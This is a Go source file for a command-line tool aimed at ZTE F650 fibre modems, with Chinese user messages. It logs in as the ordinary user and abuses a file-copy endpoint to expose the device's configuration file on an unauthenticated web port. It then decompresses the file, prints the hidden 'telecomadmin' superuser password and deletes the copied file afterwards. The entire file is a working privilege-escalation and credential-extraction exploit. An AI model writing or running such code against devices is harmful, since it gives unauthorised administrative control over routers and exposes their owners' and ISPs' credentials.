package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	Host = "http://192.168.1.1"
	UrlLogin = Host + "/cgi-bin/luci"
	UrlGetToken = Host + "/cgi-bin/luci/"
	UrlGetDevInfo = Host + "/cgi-bin/luci/admin/settings/gwinfo?get=all"
	UrlExploit = Host + "/cgi-bin/luci/admin/storage/copyMove"
	UrlDownCfg = Host + ":8080/db_user_cfg.xml"
	UrlDeleteFile = Host + "/cgi-bin/luci/admin/storage/deleteFiles"
)

var (
	h bool
	s bool
	p string
)

type F650 struct {
	username string
	psd string
	cookie *http.Cookie
	token string
	isLogin bool
	version Version
}

type Version struct {
	DevType string `json:"DevType"`
	ProductCls string `json:"ProductCls"`
	SWVer string `json:"SWVer"`

}

type Bytes []byte

func init() {
	flag.BoolVar(&h, "h", false, "帮助")
	flag.BoolVar(&s, "s", false, "存在该参数时，解密后的配置文件将保存在当前目录")
	flag.StringVar(&p, "p", "", "光猫的管理密码")
}

func main() {
	f650 := F650 {username: "useradmin"}
	if len(os.Args) == 1 {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Print("用户名： useradmin\n密  码： ")
		if scanner.Scan() {
			f650.psd = scanner.Text()
		}
	} else {
		flag.Parse()
		if h {
			flag.Usage()
			os.Exit(0)
		}
		f650.psd = p
	}
	f650.login()
	if f650.isLogin {
		f650.exploit()
		f650.readPass()
		f650.Clear()
	}
}

func (f *F650) login() {
	client := http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	values := url.Values{}
	values.Add("username", f.username)
	values.Add("psd", f.psd)
	resp, err := client.PostForm(UrlLogin, values)
	if err != nil {
		fmt.Println(err)
		return
	}
	if resp.StatusCode == http.StatusFound {
		f.cookie = resp.Cookies()[0]
		f.isLogin = true
	} else {
		fmt.Println("\n登录失败: 密码错误")
		return
	}
	fmt.Println("\n登录成功")

	// 获取token
	req, _ := http.NewRequest(http.MethodGet, UrlGetToken, nil)
	req.AddCookie(f.cookie)
	resp, _ = client.Do(req)
	tokenBody, err := ioutil.ReadAll(resp.Body)
	if err == nil {
		str := string(tokenBody)
		index := strings.Index(str, "token")
		if index >= 0 {
			f.token = str[index + 8 : index + 8 + 32]
		}
	}

	// 获取版本
	req, _ = http.NewRequest(http.MethodGet, UrlGetDevInfo, nil)
	req.AddCookie(f.cookie)
	resp, _ = client.Do(req)
	defer resp.Body.Close()
	verBody,err := ioutil.ReadAll(resp.Body)
	version := Version{}
	if err == nil {
		json.Unmarshal(verBody, &version)
	}
	f.version = version
	fmt.Println("-----------------------------------------")
	fmt.Printf("设备类型：%s\n设备型号：%s\n固件版本：%s\n",
		f.version.DevType, f.version.ProductCls, f.version.SWVer)
	fmt.Println("-----------------------------------------")
}

func (f *F650) exploit() {
	values := url.Values{}
	values.Add("token", f.token)
	values.Add("opstr", "copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml")
	values.Add("fileLists", "db_user_cfg.xml/")
	values.Add("_", "0.5610212606529983")
	// 部分设备只能使用post请求,因此这里两种请求都用一次
	// Get
	Url, _ := url.Parse(UrlExploit)
	Url.RawQuery = values.Encode()
	req, _ := http.NewRequest(http.MethodGet, Url.String(), nil)
	req.AddCookie(f.cookie)
	(&http.Client{}).Do(req)
	// Post
	req, _ = http.NewRequest(http.MethodPost, UrlExploit, strings.NewReader(values.Encode()))
	req.AddCookie(f.cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	(&http.Client{}).Do(req)
}

func (f *F650) readPass() {
	req, _ := http.NewRequest(http.MethodGet, UrlDownCfg, nil)
	resp, err := (&http.Client{}).Do(req)
	if err != nil || resp.StatusCode != http.StatusOK {
		fmt.Println("似乎不支持你的光猫")
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	dataBytes := unPack(body)
	index := bytes.Index(dataBytes, []byte("telecomadmin"))
	if index < 0 {
		fmt.Println("似乎不支持你的光猫")
		return
	}
	index = bytes.Index(dataBytes[index:], []byte("val=\"")) + index + len("val=\"")
	end := bytes.Index(dataBytes[index:], []byte("\"")) + index
	fmt.Printf("账号： %s\n密码： %s\n", "telecomadmin", string(dataBytes[index:end]))

	if s {
		filename := "./db_user_cfg.xml"
		file, err := os.OpenFile(filename, os.O_CREATE|os.O_TRUNC, os.ModePerm)
		if err != nil {
			fmt.Printf("文件： %s创建失败\n%s\n", filename, err)
		}
		defer file.Close()
		file.Write(dataBytes)
	}
}

func (f *F650) Clear() {
	values := url.Values{}
	values.Add("token", f.token)
	values.Add("path", "//home/httpd/public")
	values.Add("fileLists", "db_user_cfg.xml/")
	values.Add("_", "0.5610212606529983")
	req, _ := http.NewRequest(http.MethodPost, UrlDeleteFile, strings.NewReader(values.Encode()))
	req.AddCookie(f.cookie)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	(&http.Client{}).Do(req)
	if len(os.Args) == 1 {
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
	}
}

func unPack(data Bytes) Bytes {
	var nextOff, blockSize  uint32 = 60, 0
	var out bytes.Buffer
	buf := make(Bytes, 4)
	reader := bytes.NewReader(data)
	for {
		if nextOff <= 0 {
			break
		}
		// nextOff + 4是为了跳过记录解压后的数据大小的字节
		reader.Seek(int64(nextOff + 4), io.SeekStart)
		// 压缩数据块大小
		reader.Read(buf)
		blockSize = buf.toUint32()
		// 下一块位置
		reader.Read(buf)
		nextOff = buf.toUint32()
		//读取压缩块的数据
		blockBuf := make(Bytes, blockSize)
		reader.Read(blockBuf)
		// 解压缩
		bytesReader := bytes.NewBuffer(blockBuf)
		r, _ := zlib.NewReader(bytesReader)
		io.Copy(&out, r)
	}

	return out.Bytes()
}

func (n *Bytes) toUint32() (res uint32) {
	byteBuf := bytes.NewBuffer(*n)
	binary.Read(byteBuf, binary.BigEndian, &res)
	return
}


